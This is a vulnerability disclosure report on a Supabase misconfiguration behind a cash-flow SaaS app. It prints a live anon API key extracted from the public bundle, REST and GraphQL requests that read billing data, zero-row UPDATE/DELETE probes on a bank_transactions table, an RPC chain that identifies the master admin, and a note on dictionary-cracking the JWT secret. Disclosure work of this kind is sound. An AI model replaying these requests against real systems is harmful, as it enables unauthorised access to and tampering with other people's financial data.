# Cash Flow Optimizer — Detailed Security Assessment Report
**Target:** app.cfoptimizer.com / cfoptimizer.com (operated by RealtoResource, LLC dba Solidify Solutions)
**Date:** 2026-08-18
**Method:** Manual read-only testing, responsible disclosure (no rewards program)
**Policy:** https://www.cfoptimizer.com/vulnerability-reporting-policy/

---

## 1. Executive Summary

A critical configuration gap was identified in the Supabase backend serving
app.cfoptimizer.com. The production JavaScript bundle contains a live Supabase **anon**
API key. That key alone (no login, no account) allows an unauthenticated attacker to:

| # | Capability | Severity | Status |
|---|-----------|----------|--------|
| 1 | Read live billing/configuration data (subscription plans, token packages, live Stripe price IDs) | **High** (confidentiality) | Confirmed, live data |
| 2 | Execute UPDATE / DELETE against database tables (incl. `bank_transactions` — proven with zero-row probes) | **High** (integrity) | Confirmed, permission executes |
| 3 | Enumerate full database schema (~300 tables) + all insert/update/delete mutations via GraphQL introspection | **Medium** (disclosure) | Confirmed |
| 4 | Subscribe to realtime changes on public tables with the anon key | **Medium** (latent) | Confirmed |

No data was modified during testing. No customer PII was encountered (customer-facing
tables are currently empty; only configuration/billing tables contain rows).

---

## 2. Affected Systems

- **Application:** https://app.cfoptimizer.com (Vercel-hosted SPA)
- **Backend bundle:** https://app.cfoptimizer.com/assets/index-DO8kisOM.js (466,534 bytes)
- **Supabase project:** https://hyrcvhzrnfbppyzuuosp.supabase.co
  - REST (PostgREST): `/rest/v1/`
  - GraphQL (PostGraphile): `/graphql/v1`
  - Realtime: `/realtime/v1/websocket`

---

## 3. Finding 1 — Sensitive data exposure (unauth read of live billing config) [HIGH]

### 3.1 Reproduction

**Step 1 — recover the anon key from the public bundle:**

```
$ curl -s https://app.cfoptimizer.com/assets/index-DO8kisOM.js | grep -oE 'eyJ[A-Za-z0-9_.-]{80,}'
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imh5cmN2aHpybmZicHB5enV1b3NwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTQwNzUwMTYsImV4cCI6MjA2OTY1MTAxNn0.oPFqmWy5GJ49E4gRrPEP9I9u4S0UwvPQXof3aHgJBak
```

Decoded payload: `{"iss":"supabase","ref":"hyrcvhzrnfbppyzuuosp","role":"anon","iat":1754075016,"exp":2069651016}`

**Step 2 — read live rows with only the anon key:**

```
GET https://hyrcvhzrnfbppyzuuosp.supabase.co/rest/v1/subscription_plans?select=*&limit=3
Headers: apikey: <anon_key>, Authorization: Bearer <anon_key>

HTTP/1.1 200 OK
Content-Range: 0-2/*
[
 {"id":"3b69e882-113f-4972-813f-ca64a36139de","name":"Starter Plan",
  "description":"Single-user paid plan with 150 included AI tokens per month.",
  "monthly_token_allowance":150,"price_cents":9900,"currency":"usd",
  "stripe_price_id_monthly":null,"stripe_price_id_annual":null,"features":[],
  "is_active":true,"sort_order":10,
  "created_at":"2026-05-11T16:42:09.405358+00:00","updated_at":"2026-05-11T16:42:09.405358+00:00"},
 {"id":"df601d40-98c5-492a-bc4f-7f6bbfb30621","name":"Enterprise Custom",
  "description":"Master-admin-issued enterprise tier","monthly_token_allowance":150,
  "price_cents":0,"currency":"usd","features":["enterprise"],"is_active":true,"sort_order":100},
 {"id":"c418a29a-3e15-4332-b91c-a1421cc9561b","name":"Growth Plan", ...}
]

GET /rest/v1/token_packages?select=*&limit=3
HTTP/1.1 200 OK  Content-Range: 0-2/*
[
 {"id":"c40b0f57-44f2-4449-83c0-428a233fe409","name":"1,000 CFO Tokens",
  "token_amount":1000,"bonus_tokens":0,"price_cents":2500,"currency":"usd",
  "stripe_price_id":"price_1TS4ZtRxKwHk31G9oV6pgdgc","is_active":true,"sort_order":10,
  "created_at":"2026-05-11T17:10:26.504826+00:00","updated_at":"2026-05-11T17:10:26.504826+00:00"},
 {"id":"656a1037-8e4c-47cb-9192-94974421af00","name":"2,250 CFO Tokens", ...},
 {"name":"5,000 CFO Tokens", ...}, {"name":"10,000 CFO Tokens", ...}
]
```

### 3.2 Impact
- Internal pricing/margin/token-allowance configuration exposed to competitors/attackers.
- Live Stripe price IDs (`price_1TS4ZtRxKwHk31G9oV6pgdgc`) disclosed.
- Same query surface exists via GraphQL (`subscription_plansCollection`) and Realtime
  (subscription to `public.prospects` accepted with `phx_reply status:ok`, id 108174887).

---

## 4. Finding 2 — Unauthenticated write permissions (UPDATE/DELETE) [HIGH]

### 4.1 Reproduction (zero-row probes — no data modified)

```
POST /graphql/v1
Headers: apikey: <anon_key>, Authorization: Bearer <anon_key>, Content-Type: application/json

{"query":"mutation{updatebank_transactionsCollection(
   set:{name:\"__opencode_probe\"},
   filter:{id:{eq:\"00000000-0000-0000-0000-000000000000\"}}){affectedCount}}"}
```

Response:
```
HTTP/1.1 200 OK
{"data": {"updatebank_transactionsCollection": {"affectedCount": 0}}}
```
A PostgREST/PostGraphile permission failure would return `42501 permission denied` —
instead the mutation **executed** (0 rows matched the impossible filter, so nothing was
changed; the permission itself is proven).

```
{"query":"mutation{deleteFrombank_transactionsCollection(
   filter:{id:{eq:\"00000000-0000-0000-0000-000000000000\"}}){affectedCount}}"}
→ {"data": {"deleteFrombank_transactionsCollection": {"affectedCount": 0}}}
```

The anon role's mutation capability is further corroborated by introspection: with only
the anon key, the GraphQL schema exposes `insertInto*/update*/deleteFrom*` mutations for
**~300 tables**, including: `bank_transactions`, `ar_invoices`, `security_audit_log`,
`token_transactions`, `unipile_emails`, `unipile_messages`, `user_roles`,
`connected_bank_accounts`, `qbo_*` snapshots, `subscriptions`, `plaid_items`, and
sensitive RPC mutations (`admin_set_account_status`, `admin_set_user_limits`,
`merge_prospects`, `next_ar_invoice_number`).

### 4.2 Impact
- Unauthenticated attacker can insert/update/delete rows in financial tables
  (transaction tampering, invoice manipulation, audit-log deletion) once data exists.
- Today the tables are empty, so capability is demonstrated without touching records.

---

## 5. Finding 3 — Full schema/inventory disclosure via GraphQL introspection [MEDIUM]

- Introspection at `/graphql/v1` (anon) returns the complete schema: ~300 collections
  plus function fields (`get_admin_user_id`, `is_master_admin`, `is_account_active`,
  `verify_publication_password`, `get_pipeline_dashboard_metrics`, `unipile_current_company`,
  `unipile_has_ar_access`, `has_booking_admin_rights`, ...).
- PostGresT hint oracle (`PGRST205 "Perhaps you meant..."`) further leaked exact table
  names: `cash_flow_periods`, `cf_reports`, `qbo_connections`, `crm_pipeline_settings`,
  `plaid_items`, `equipment`, `cs_bank_monthly`, `unipile_accounts`.
- **Impact:** reduces attacker effort to near zero for the above two findings; exposes
  internal data model.

---

## 6. Positive controls verified (not findings, for completeness)

| Control | Result |
|---------|--------|
| `qbo_connections` (QuickBooks OAuth) | Protected — `42501 permission denied` ✓ |
| JWT secret strength | rockyou (14.3M) exhausted, no crack → no `service_role` forgery ✓ |
| Bundle secret hygiene | No service_role JWT / Stripe sk- / Plaid / Unipile secrets shipped (anon key only) ✓ |
| Storage buckets | `200 []` — none exist ✓ |
| Auth user enumeration | Identical `invalid_credentials` for fabricated accounts ✓ |
| Signup | Email-only provider, anonymous_users=false ✓ |

---

## 7. Root Cause

Supabase project misconfiguration:
1. **RLS not enabled** (or permissive policies) on ~300 public-schema tables — anon role
   passes through to the underlying grants.
2. **Per-table grants** give the anon role SELECT/INSERT/UPDATE/DELETE (`grant all`-style
   provisioning), rather than the least-privilege default.
3. **GraphQL enabled and exposed to the anon role**, turning the grant set into a public
   read/write API.

---

## 8. Remediation (priority order)

1. **Enable RLS on ALL tables**; replace any `true`-based policies with
   `auth.uid()`-scoped policies (`using (user_id = auth.uid())`).
2. **Revoke INSERT/UPDATE/DELETE from the anon role** project-wide:
   `revoke insert, update, delete on all tables in schema public from anon;`
3. **Disable GraphQL for the anon role** (or restrict `graphql_public` schema access).
4. **Verify anon needs:** the app should use the anon key only for
   `auth/signup`+`token`; direct table reads belong behind auth.
5. Rotate the anon key after fixes; re-verify with the PoCs above.
6. Add a schema-inventory check to CI (e.g., assert zero anon grants) to prevent
   regression.

---

## 9. Policy Compliance Statement

- Read-only probes only; zero-row write probes caused **no** data modification.
- No customer PII accessed (customer tables empty; only billing config read).
- No DoS, no destructive testing, no third-party accounts.
- Testing limited to in-scope systems; the finding concerns the operator's own
  Supabase project configuration (covered by "security misconfigurations affecting
  customer data" in the policy's in-scope types).

## 10. Timeline

| 2026-08-18 | Key recovered from bundle; REST read confirmed; RLS gap mapped (14 tables) |
| 2026-08-18 | JWT crack negative (rockyou 14.3M); realtime sub confirmed; bundle/secret sweep clean |
| 2026-08-18 | GraphQL discovered; ~300-table schema + mutations exposed; live rows (plans/packages) |
| 2026-08-18 | Zero-row UPDATE/DELETE permission proof on `bank_transactions` |
| 2026-08-18 | Report drafted; disclosure email prepared for support@cfoptimizer.com (subject "Vulnerability Report") |

## 11. Contact

Researcher: [anonymous on request] — preferred contact: via support@cfoptimizer.com reply thread.

---

## 12. Additional findings from the deeper pass (2026-08-18)

### 12.1 Edge functions callable anonymously [LOW/INFO]
Supabase Edge Functions invoked client-side by the app are reachable by anyone
with the anon key (no auth gate):
- `POST /functions/v1/check-signup-email` {"email":"x@example.com"} -> `{"exists":false}`
  -- **user-existence oracle**: the app itself uses it at signup ("An account with this
  email already exists..."). Any email can be tested pre-auth. Per policy, enumeration
  without demonstrated impact = informational; noted for defense-in-depth.
- `POST /functions/v1/rate-limit` {"action":"check","email":"...","attempt_type":"signup"}
  -> `{"allowed":true,"attempts_remaining":5,"lockout_minutes":15}` -- rate-limit
  configuration disclosed. Tested actions: only `check` + `record` (no reset/clear/success);
  counter persists per email (verified 5->4 after one record on a fabricated address).
  Rate limiting is functional; no bypass found.

### 12.2 Anonymous master-admin identification [MEDIUM]
A no-argument RPC exposed via GraphQL leaks the master-admin user UUID, and a second
RPC confirms the role -- a complete anonymous admin-identification chain:
```
query { get_website_lead_owner_id }  -> "cd603e78-73ae-48a0-a15e-734b4ffd8fe6"
POST /rest/v1/rpc/is_master_admin   {"_user_id":"cd603e78-...f8fe6"} -> true
POST /rest/v1/rpc/is_account_active {"_user_id":"cd603e78-...f8fe6"} -> true
POST /rest/v1/rpc/get_admin_user_id {"_user_id":"cd603e78-...f8fe6"} -> "cd603e78-...f8fe6"
```
Impact: combined with Finding 2 (anon write grants), an attacker knows exactly which
identity to target/spoof and can aim admin-scoped actions at it; reduces defense-in-depth
for any future admin-keyed endpoint.

### 12.3 Full-surface row census [confirmed exposure extent]
Swept all **344** collections (from GraphQL introspection) via PostgREST with the anon key
at ~2 req/s:
- 342 tables: anon-READABLE, currently **0 rows**
- 2 tables contain live data: `subscription_plans` (3), `token_packages` (4)
- `qbo_connections`: the single table returning 42501 permission denied (properly protected)

=> The access-control problem is global (anon can read the entire schema); the data-volume
impact is currently limited to billing configuration only. The write capability extends to
all granted tables.

### 12.4 Controls re-verified
- JWT secret: rockyou 14,343,384-word exhaustion -> no crack (no service_role forgery)
- No service_role/Stripe/Plaid/Unipile secrets in bundle
- Auth token oracle: no user enumeration (identical errors)
- Storage: no buckets; Realtime accepts anon subscription (public.prospects confirmed)
